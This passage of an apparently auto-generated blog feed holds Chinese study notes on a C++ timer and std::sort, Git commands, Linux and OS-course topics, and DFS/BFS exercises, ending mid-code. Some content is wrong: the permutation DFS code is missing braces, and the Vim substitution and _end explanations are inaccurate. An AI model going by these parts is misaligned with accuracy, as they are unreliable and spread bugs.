class_">Timer</span> &#123;</span><br><span class="line">std::chrono::time_point &lt; std::chrono::steady_clock&gt; start,end;</span><br><span class="line">std::chrono::duration&lt;<span class="type">float</span>&gt; duration ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Timer</span>()</span><br><span class="line">&#123;</span><br><span class="line">start = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~<span class="built_in">Timer</span>()</span><br><span class="line">&#123;</span><br><span class="line">end = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">duration = end - start;</span><br><span class="line"><span class="keyword">auto</span> duration1 = std::chrono::<span class="built_in">duration_cast</span>&lt;std::chrono::milliseconds&gt;(end - start);</span><br><span class="line">std::cout &lt;&lt; duration  &lt;&lt; std::endl &lt;&lt; duration1 &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Timer time;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span> ; i &lt;<span class="number">100</span> ; i ++)</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hello\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="std-sort"><a href="#std-sort" class="headerlink" title="std::sort"></a>std::sort</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T,<span class="type">int</span> N&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">const</span> std::array&lt;T,N&gt;&amp; data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i ++)</span><br><span class="line">std::cout &lt;&lt; data[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::array&lt;<span class="type">int</span>,6&gt; arr = &#123; <span class="number">1</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line">std::<span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>(), std::<span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line"><span class="built_in">print</span>(arr);<span class="comment">//11 7 6 5 1 1</span></span><br><span class="line"></span><br><span class="line">std::<span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">print</span>(arr);<span class="comment">//1 1 5 6 7 11</span></span><br><span class="line"></span><br><span class="line">std::<span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>(), [](<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (b == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a &gt; b;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">print</span>(arr);<span class="comment">//11 7 6 5 1 1</span></span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="std-function"><a href="#std-function" class="headerlink" title="std::function"></a>std::function</h3><p>//TODO</p>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> cherno </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> cherno </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git</title>
      <link href="/2024/03/17/others/git/"/>
      <url>/2024/03/17/others/git/</url>
      
        <content type="html"><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><p><a href="https://missing-semester-cn.github.io/2020/version-control/">版本控制(Git) · the missing semester of your cs education (missing-semester-cn.github.io)</a></p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p><code>git init</code></p><ul><li><p>创建一个git仓库</p><p><code>git status</code></p></li><li><p>查看文件状态</p></li><li><code>-s</code>状态简览</li></ul><p><code>git add</code></p><ul><li>跟踪一个文件</li><li>把已跟踪的文件放入暂存区</li><li>合并时把有冲突的文件标记为已解决状态</li></ul><p><code>git reset HEAD filename</code></p><ul><li>取消暂存</li></ul><p><code>git diff</code></p><ul><li>比较工作目录中当前文件和暂存区域快照之间的差异。也就是修改之后还没有暂存起来的变化内容</li></ul><p><code>git diff --staged</code>    <code>git diff --cached</code></p><ul><li>比对已暂存的文件与最后一次提交的文件的差异</li></ul><p><code>.gitignore</code></p><ul><li>忽略文件配置文件,</li></ul><p><code>git commit</code>    <code>git commit -a</code>        <code>git commit --amend</code></p><ul><li>提交更新,<code>-a</code>表示把所有已经跟踪过的文件暂存起来一起提交，跳过使用暂存区。<code>--amend</code>表示重新提交。</li></ul><p><code>git rm -f</code></p><ul><li>强制删除。</li></ul><p><code>git mv file_from file_to</code></p><ul><li>重命名、移动文件。</li></ul><p><code>git log -p -2</code>             <code>--stat</code>        <code>--graph</code>    </p><ul><li>查看历史提交记录，显示差异，显示最近两次提交。<code>--stat</code>参数输出带有简略统计信息。<code>--graph</code>以ascii图形显示。</li></ul><ul><li>gitignore</li></ul><h3 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h3><p><code>git remote</code>        <code>show</code>            <code>rename</code>        <code>remove</code></p><ul><li>查看远程仓库，<code>show</code>查看更多信息，<code>rename</code>重命名，<code>remove</code>移除远程仓库。</li></ul><p><code>git remote add &lt;shortname&gt; &lt;url&gt;</code></p><ul><li>添加远程仓库</li></ul><p><code>git fetch &lt;remote&gt;</code></p><ul><li>下载数据到本地仓库，不会自动合并</li></ul><p><code>git pull &lt;remote&gt;</code></p><ul><li>下载数据到本地仓库，自动合并</li></ul><p><code>git push &lt;remote&gt; &lt;branch&gt;</code></p><ul><li>推送到远程仓库</li></ul><h3 id="打标签"><a href="#打标签" class="headerlink" title="打标签"></a>打标签</h3><ul><li>轻量标签：某个特定提交的引用</li><li>附注标签：一个完整对象</li></ul><h4 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h4><p><code>git tag</code></p><ul><li>查看标签</li></ul><p><code>git show &lt;TagName&gt;</code></p><ul><li>显示特定标签信息</li></ul><p><code>git tag -a &lt;Version&gt; -m &lt;Message&gt;</code></p><ul><li>附注标签</li><li>后期打标签则再参数后加入<code>sha-1</code>散列值</li></ul><p><code>git tag &lt;Version&gt;</code></p><ul><li>轻量标签</li><li>后期打标签则再参数后加入<code>sha-1</code>散列值</li></ul><p><code>git tag -d &lt;tagname&gt;</code></p><ul><li>删除标签</li></ul><h4 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h4><p><code>git push origin &lt;tagname&gt;</code></p><ul><li>共享标签</li></ul><p><code>git push &lt;remote&gt; --delete &lt;tagname&gt;</code></p><ul><li>移除远程标签</li></ul><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><ul><li><code>Git</code>保存的不是文件的变化或者差异，而是一系列不同时刻的<code>快照</code>。</li><li><p><code>Git</code>提交对象包含了作者的姓名和邮箱、提交时输入的信息以及<code>指向它的父对象的指针</code>。</p></li><li><p><code>Git</code>的分支，本质上仅仅是指向提交对象的可变指针。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJU_OS_0x1</title>
      <link href="/2024/03/06/OS/jyyOS_0x1/"/>
      <url>/2024/03/06/OS/jyyOS_0x1/</url>
      
        <content type="html"><![CDATA[<h1 id="NJU-OS-2024-南京大学《操作系统：设计与实现》"><a href="#NJU-OS-2024-南京大学《操作系统：设计与实现》" class="headerlink" title="NJU OS    2024 南京大学《操作系统：设计与实现》"></a>NJU OS    2024 南京大学《操作系统：设计与实现》</h1><h3 id="一些好词佳句"><a href="#一些好词佳句" class="headerlink" title="一些好词佳句"></a>一些好词佳句</h3><ul><li><h3 id="Life-is-short-you-need-Python"><a href="#Life-is-short-you-need-Python" class="headerlink" title="Life is short, you need Python!"></a>Life is short, you need Python!</h3></li></ul><h3 id="linux知识"><a href="#linux知识" class="headerlink" title="linux知识"></a>linux知识</h3><ul><li><code>echo $status</code> 打印程序返回值</li><li>可以通过管道将输出传递给<code>less命令</code>查看输出，同时，可以通过<code>2&gt;&amp;1 |</code>将标准错误输出也输出到less</li><li>可以通过<code>strace -f</code>可以记录系统调用和子进程，甚至可以追踪他自己！</li><li><code>QEMU</code>, A fast and portable dynamic translator</li><li><code>make -nB</code>显示 Makefile 文件中指定的命令的执行情况</li><li>可以通过<code>mount</code>挂载文件</li><li><code>gcc</code>参数<code>-Wl,--verbose</code>可以详细展示编译过程，-I指定头文字路径</li><li><code>vim -</code> 打开一个新的 Vim 编辑器实例，并将其标准输入设置为来自终端的输入，使用管道符号可以很方便编辑程序的输出。</li><li><code>sed</code> 是一个流编辑器，用于对文本进行转换、筛选和编辑。</li><li><code>Generators/Coroutines</code>在python的作用生成器和协程是python强大的工具</li><li>可以使用强大的python配置<code>gdb</code>调试脚本，import gdb，import os引入gdb和标准库模块。</li><li><code>:%s/ /\r  /g</code>是在Vim编辑器中使用的替换命令，它的作用是将文本中的空格替换为一个换行符（<code>\r</code>），并在每个空格后面添加两个空格。</li></ul><h3 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h3><h4 id="assert-h"><a href="#assert-h" class="headerlink" title="assert.h"></a>assert.h</h4><p><strong>简介</strong></p><p><code>assert.h</code> 是 C 标准库中的一个头文件，用于<code>程序调试</code>。它提供了一个名为 <code>assert</code> 的宏，可以用来检查程序运行时的状态，并在发现错误时终止程序。</p><p><strong>用法</strong></p><p><code>assert</code> 宏接受一个表达式作为参数。如果表达式求值为非零，则宏不执行任何操作。如果表达式求值为零，则宏会打印一条错误信息，并调用 <code>abort()</code> 函数终止程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    assert(p != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;程序不能到达此处&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.out: test.c:<span class="number">6</span>: main: Assertion `p != NUL<span class="string">L&#x27; failed.</span></span><br></pre></td></tr></table></figure><p>我们可以通过设置<code>NDEBUG</code>来关闭<code>assert</code>宏以便提高性能。</p><h4 id="end"><a href="#end" class="headerlink" title="_end"></a>_end</h4><p>在C语言中，<strong><code>_end</code></strong> 通常是一个符号，代表程序数据段的结尾。它通常由编译器生成，并用于链接器将程序的所有部分链接在一起。</p><p><strong>以下是 <code>_end</code> 的一些常见用法：</strong></p><ul><li><strong>标记数据段的结尾:</strong> 编译器通常会在数据段的末尾放置一个名为 <code>_end</code> 的符号。链接器会使用此符号来确定数据段的大小和位置。</li><li><strong>提供程序大小:</strong> 您可以使用 <code>_end</code> 符号来计算程序的大小。例如，您可以使用以下代码来计算程序的代码段大小：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> code_size = (<span class="type">size_t</span>)_end - (<span class="type">size_t</span>)&amp;_start;</span><br></pre></td></tr></table></figure><ul><li><strong>用于调试:</strong> 在某些情况下，您可以使用 <code>_end</code> 符号来调试程序。例如，您可以使用它来检查数据段是否被正确初始化。</li></ul><h3 id="question-proc内ns文件与status文件的区别"><a href="#question-proc内ns文件与status文件的区别" class="headerlink" title="question:/proc内ns文件与status文件的区别"></a>question:/proc内ns文件与status文件的区别</h3><p>我们知道，在linux，万物皆文件，我们可以通过终端访问linux的一切software和hardware。</p><ul><li><code>符号链接</code>的工作原理是将一个文件或目录的路径关联到另一个文件或目录上。当系统尝试访问符号链接时，实际上是通过符号链接所指向的路径来访问目标文件或目录。</li><li><code>命名空间</code>是 Linux 内核提供的一种机制，用于将一组系统资源隔离到独立的命名空间中。通过命名空间，可以创建一种虚拟化的环境，每个环境都拥有自己独立的一组资源，包括进程、网络、文件系统、用户等，使得在同一系统上运行的进程能够共享系统的硬件资源，但彼此之间是隔离的。类似于虚拟化。</li></ul><ol><li><p><strong><code>/proc/[pid]/ns</code> 文件：</strong></p><p>这个文件夹包含了一个进程的命名空间相关的<code>符号链接</code>，主要用于隔离不同进程。通过读取这些符号链接，可以了解进程所在的各种命名空间，从而实现对命名空间的管理和隔离。</p></li><li><p><strong><code>/proc/[pid]/status</code> 文件：</strong></p><p>这个文件提供了有关进程的详细信息，包括进程的状态、内存使用情况、线程数、进程ID等， 文件中的信息是由内核动态生成的，反映了进程的当前状态和资源使用情况。</p></li></ol><h3 id="不同视角的操作系统"><a href="#不同视角的操作系统" class="headerlink" title="不同视角的操作系统"></a>不同视角的操作系统</h3><p>Everything is <code>State Machine</code> 都是状态机</p><p>状态机是一种抽象的数学模型，用于描述有限个状态以及在这些状态之间的转移和动作等行为。</p><ul><li><strong>状态:</strong> 状态是系统在某个时刻的具体情况。例如，交通信号灯有三个状态：红灯、黄灯和绿灯。</li><li><strong>转移:</strong> 转移是指系统从一个状态到另一个状态的变化。例如，交通信号灯由红灯变为绿灯是一个转移。</li><li><strong>动作:</strong> 动作是指在状态转移时发生的事件。例如，交通信号灯由红灯变为绿灯时，会发出通行的声音</li></ul><h3 id="应用视角的操作系统"><a href="#应用视角的操作系统" class="headerlink" title="应用视角的操作系统"></a>应用视角的操作系统</h3><p>操作系统的职责：提供令应用程序<strong>舒适</strong>的抽象 (对象 + API)</p><h4 id="编译器优化“三板斧”"><a href="#编译器优化“三板斧”" class="headerlink" title="编译器优化“三板斧”"></a>编译器优化“三板斧”</h4><ul><li><strong>函数内联</strong>：将函数调用替换为函数体本身的内容</li><li><strong>常量传播</strong>：在编译时计算常量表达式的值并替换</li><li><strong>死代码消除</strong>：删除永远不会被执行到的代码</li></ul><h4 id="不可优化代码"><a href="#不可优化代码" class="headerlink" title="不可优化代码"></a>不可优化代码</h4><ul><li>External function calls (链接时才能确定到底是什么代码)<ul><li>未知的代码可能包含<strong>系统调用</strong></li><li>因此不可删除、移出循环等，且要保证参数传递完全一致</li></ul></li><li>编译器提供的 “不可优化” 标注<ul><li><code>volatile</code> [load | store | inline assembly]</li></ul></li></ul><h3 id="硬件视角的操作系统"><a href="#硬件视角的操作系统" class="headerlink" title="硬件视角的操作系统"></a>硬件视角的操作系统</h3><ul><li>firmware运行程序前的计算机系统配置</li><li>EFI 分区是一种特殊的磁盘分区，用于存储 系统引导相关的数据。GRUB是一个开源引导和加载程序（通常存储在硬盘的第一个扇区，即EFI分区），经过一系列操作将控制权转交给OS。</li></ul><h3 id="数学视角的操作系统"><a href="#数学视角的操作系统" class="headerlink" title="数学视角的操作系统"></a>数学视角的操作系统</h3><ul><li><p>一旦把操作系统、应用程序当做 “数学对象” 处理，那么我们图论、数理逻辑中的工具就能被应用于处理程序——例如，可以用图遍历 “暴力枚举” 的方法证明程序的正确性。</p></li><li><p>证明程序正确：暴力枚举所有可能、写出证明</p></li></ul><p>volatile</p><p>grep  \”cs\” | sort | uniq</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> nju_os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> nju_os </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图论</title>
      <link href="/2024/02/29/%E7%AE%97%E6%B3%95/%E5%9B%BE%E8%AE%BA/"/>
      <url>/2024/02/29/%E7%AE%97%E6%B3%95/%E5%9B%BE%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="图的存储"><a href="#图的存储" class="headerlink" title="图的存储"></a>图的存储</h3><h3 id="搜索与图论"><a href="#搜索与图论" class="headerlink" title="搜索与图论"></a>搜索与图论</h3><div class="table-container"><table><thead><tr><th></th><th>数据结构</th><th>空间</th><th></th></tr></thead><tbody><tr><td>DFS</td><td>stack</td><td>O(n)</td><td></td></tr><tr><td>BFS</td><td>queue</td><td><script type="math/tex">O(2^n)</script></td><td>最短路</td></tr></tbody></table></div><h3 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h3><ul><li>采用stack</li><li>回溯——恢复状态</li><li>剪枝——提前回溯</li></ul><p>遇到诸如放置、字典序等可使用深搜输出全部组合。</p><h3 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h3><ul><li>采用queue</li><li>边权都为1时，为最短路径</li><li>DP是特殊的最短路问题</li></ul><h3 id="acwing842-——DFS"><a href="#acwing842-——DFS" class="headerlink" title="acwing842 ——DFS"></a>acwing842 ——DFS</h3><p><img src="./../../../../../AppData/Roaming/Typora/typora-user-images/image-20240709120409519.png" alt="image-20240709120409519"></p><p>从0开始进行深搜（不从1开始是因为1也要进行排序）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;  <span class="comment">//记录深度</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> path[N];</span><br><span class="line"><span class="type">int</span> st[N];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> u)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (u== n)  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span> ;i &lt; n; i ++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, path[i]);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!st[i])</span><br><span class="line">                path[u] = i;</span><br><span class="line">                st[i] = <span class="literal">true</span>;</span><br><span class="line">                dfs(u + <span class="number">1</span>);</span><br><span class="line">                st[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;   </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">  </span><br><span class="line">    dfs(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="acwing843-——DFS"><a href="#acwing843-——DFS" class="headerlink" title="acwing843 ——DFS"></a>acwing843 ——DFS</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240709120643257.png" alt="image-20240709120643257"></p><p>通过枚举每行（若n皇后问题能解决，则每行必有一个皇后），再通过行表示列和对角线（计算不能放置的位置，如该行某点放置则该点列不能放置），判断条件符合则递归调用dfs。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N  = <span class="number">200</span>; </span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">char</span> g[N][N];</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> col[N], dg[N], udg[N];</span><br><span class="line"><span class="comment">//列    column</span></span><br><span class="line"><span class="comment">//行    line</span></span><br><span class="line"><span class="comment">//对角线    diagonal</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u == n)  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span> ;i &lt; n; i ++)    <span class="built_in">puts</span>(g[i]); <span class="comment">//char* 型指针</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++)       <span class="comment">//枚举列</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!col[i] &amp;&amp; !dg[u + i] &amp;&amp; !udg[n - u + i])</span><br><span class="line">               &#123; </span><br><span class="line">                g[u][i] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">                col[i] = dg[u + i] = udg[n - u + i] = <span class="literal">true</span>;</span><br><span class="line">                <span class="built_in">dfs</span>(u + <span class="number">1</span>);</span><br><span class="line">                col[i] = dg[u + i] = udg[n - u + i] = <span class="literal">false</span>;</span><br><span class="line">                g[u][i] =  <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j ++)</span><br><span class="line">            g[i][j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="acwing844-——BFS"><a href="#acwing844-——BFS" class="headerlink" title="acwing844 ——BFS"></a>acwing844 ——BFS</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240709162027896.png" alt="image-20240709162027896"></p><p>BFS算法相当于在有m个后继点的点处分裂为m个小鼠，同时将访问过的点在数组上标定距离（该距离是最小值，因为其他点在相同步数下并不能访问该点），最后返回要求的坐标即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"></span><br><span 